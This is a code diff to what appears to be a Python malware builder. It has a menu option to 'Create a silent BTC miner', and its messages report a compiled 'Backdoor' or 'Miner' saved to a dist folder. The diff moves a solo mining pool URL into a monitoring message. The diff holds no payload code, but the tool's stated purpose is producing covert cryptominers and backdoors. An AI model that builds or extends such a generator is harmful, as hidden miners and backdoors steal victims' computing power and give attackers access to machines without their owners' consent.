@@ -535,10 +535,8 @@ print("""
 
         ##########################################################################################
                                                 Miners
-                                    BTC POOL: https://solo.ckpool.org/
         3. Create a silent BTC miner
         
-
 """)  
 encrypted = False     
 nscan = input("Please select a module: ")
@@ -587,7 +585,8 @@ if nscan == '3':
             os.system(compcomd)
             os.system(clear)
             print(logo)
-            print('Backdoor saved under "dist" folder')
+            print('Miner saved under "dist" folder')
+    print("You can monitor your `miners` here : https://solo.ckpool.org/")
     cleanup()
 else:
     print('Please select a vaild option')
